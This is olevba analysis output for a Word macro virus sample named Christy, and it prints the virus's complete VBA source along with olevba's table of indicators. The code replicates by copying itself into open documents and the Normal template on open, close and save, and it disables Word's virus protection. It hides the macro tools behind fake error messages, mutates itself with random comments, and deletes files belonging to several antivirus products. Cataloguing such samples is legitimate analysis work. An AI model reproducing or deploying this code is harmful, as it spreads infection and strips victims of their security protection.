olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Christy-aa0c62843bae8c8e759710907a8a233781bc1aab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Christy-aa0c62843bae8c8e759710907a8a233781bc1aab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Christy.bas 
in file: Virus.MSWord.Christy-aa0c62843bae8c8e759710907a8a233781bc1aab - OLE stream: 'Macros/VBA/Christy'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    ' EQZIGWDOPPS
Sub AutoClose()
On Error Resume Next
    ' XGYWLMUVJFIKDQCFSNEZMALHTXV
    
    ' ADJEZ
    ' ONQCSGBHYIQJJIFFLQGRPPCBDGKPHVXNK
    Mutate
    
    ' PTSRTGONOHKJZNPMAJDRDFJCQ
    ' SXFJOJFPQDBQVQLEMZUJMORAQXIDLUJKT
    ' TPPGNUWCOKBLSMKYZPNPCEHADKOOUBKBIPNPIXUO
    Application.ScreenUpdating = False
    ' NEHCZHQHWIUEHBMLPAIDITQZVOPEX
   
    ' EBGTYIRUAUMFPXYQARZAYBHPVBBOIK
    WordBasic.DisableAutoMacros = 0
    ' LIBKOTPQUKUSSTEUBGYVFEGYGGSRUT
    ' KISFBXBLTTVFMWVKMJ
    Options.VirusProtection = False
    ' KVGR
    ' TLCKISIUDPYGYCZQPXOGWBLTGJKNHPFCX
    
    DocInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Christy" Then
            DocInstalled = True
        End If
    ' SDGAVUUILOUOFFJOINLOBOFZ
    Next
    ' VKUZGESAISCCHKOIHVIJKVKSRKYQNFPTLXHRXHJA

    If DocInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
    End If

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Christy" Then
            GlobalInstalled = True
        End If
    Next

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If

End Sub

Sub FileTemplates()

  MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"

End Sub

Sub AutoOpen()
On Error Resume Next

    Mutate

    Application.ScreenUpdating = False

    WordBasic.DisableAutoMacros = 0
    Options.VirusProtection = False

    DocInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Christy" Then
            DocInstalled = True
        End If
    Next

    If DocInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
    End If
    
    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Christy" Then
            GlobalInstalled = True
        End If
    Next
    
    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If

End Sub

Sub ToolsMacro()
    
  MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"

End Sub

Sub FileSaveAs()
    
    Mutate
    
    Dialogs(wdDialogFileSaveAs).Show

On Error Resume Next
    
    Application.ScreenUpdating = False
    
    WordBasic.DisableAutoMacros = 0
    Options.VirusProtection = False

    DocInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Christy" Then
            DocInstalled = True
        End If
    Next

    If DocInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
    End If

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "Christy" Then
            GlobalInstalled = True
        End If
    Next

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Christy", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If

    Application.DisplayAlerts = wdAlertsAll

End Sub

Sub Mutate()
On Error Resume Next

    ChristyPayload

    Set Current = MacroContainer

    MorePoly = Int(Rnd() * 20 + 1)

    For Grow = 1 To MorePoly
        Number = Current.VBProject.VBComponents("Christy").CodeModule.ProcCountLines("Mutate", vbext_pk_Proc)
        RandomLine = Int(Rnd() * Number + 1)
        RemarkLength = Int(Rnd() * 40 + 1)

            For Length = 1 To RemarkLength
                Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
            Next Length

        Current.VBProject.VBComponents("Christy").CodeModule.InsertLines RandomLine, vbTab & "' " & Remark
        Remark = ""
    Next Grow

End Sub

Sub ChristyPayload()
On Error GoTo Christy
  If Month(Now()) = 12 And Day(Now()) = 21 Then
    Set myRange = ActiveDocument.Range(Start:=0, End:=0)
    With myRange
      .InsertBefore "I LOVE CHRISTY"
      .Font.Name = "Arial"
      .Font.Size = 36
    End With
  End If

  If Month(Now()) = 10 And Day(Now()) = 16 Then
    MsgBox "Christy, written by DarkChasm", vbOKOnly, "I LOVE CHRISTY"
  End If
Christy:
Retro
End Sub

Sub Retro()
On Error Resume Next
Kill "C:\PC-Cillin 95\Scan32.dll"
Kill "c:\pc-cil~1\*.dll"
Kill "C:\PC-Cillin 95\Lpt$vpn.*"
Kill "C:\PC-Cillin 97\Scan32.dll"
Kill "C:\PC-Cillin 97\Lpt$vpn.*"
Kill "C:\Tsc\PC-Cillin 97\Scan32.dll"
Kill "c:\tsc\pc-cil~1\*.dll"
Kill "C:\Tsc\PC-Cillin 97\Lpt$vpn.*"
Kill "C:\Zlockav\Gsav.dat"
Kill "C:\Zlockav\Gsav.cas"
Kill "C:\Program Files\Norton AntiVirus\Viruscan.dat"
Kill "C:\progra~1\norton~1\viruscan.dat"
Kill "C:\Program Files\Symantec\Symevnt.386"
Kill "C:\progra~1\symantec\symevnt.386"
Kill "C:\Program Files\McAfee\VirusScan95\Scan.dat"
Kill "C:\progra~1\mcafee\viruss~1\scan.dat"
Kill "C:\Program Files\McAfee\VirusScan95\Mcscan32.dll"
Kill "C:\progra~1\mcafee\viruss~1\mcscan32.dll"
Kill "C:\Program Files\McAfee\VirusScan\Scan.dat"
Kill "C:\Program Files\McAfee\VirusScan\Mcscan32.dll"
Kill "C:\Program Files\Command Software\F-PROT95\Sign.def"
Kill "C:\progra~1\comman~1\f-prot95\sign.def"
Kill "C:\Program Files\Command Software\F-PROT95\Dvp.vxd"
Kill "C:\progra~1\comman~1\f-prot95\dvp.vxd"
Kill "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
Kill "C:\progra~1\Antivi~1\Avp32.exe"
Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
Kill "C:\progra~1\antivi~1\*.avc"
Kill "C:\TBAVW95\Tbscan.sig"
Kill "c:\Tbavw95\Tb*.*"
Kill "C:\Tbavw95\Tbavw95.vxd"
Kill "C:\f-macro\f-macro.exe"
Kill "C:\f-prot~1\f-prot.exe"
End Sub

Sub ToolsCustomize()

  MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"

End Sub

Sub ToolsOptions()

  MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"

End Sub

Sub ViewVBCode()

  MsgBox "This program has performed an illegal operation and will be shut down.", vbCritical, "Microsoft Word"

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Scan32.dll          |Executable file name                         |
|IOC       |Mcscan32.dll        |Executable file name                         |
|IOC       |mcscan32.dll        |Executable file name                         |
|IOC       |Avp32.exe           |Executable file name                         |
|IOC       |macro.exe           |Executable file name                         |
|IOC       |prot.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

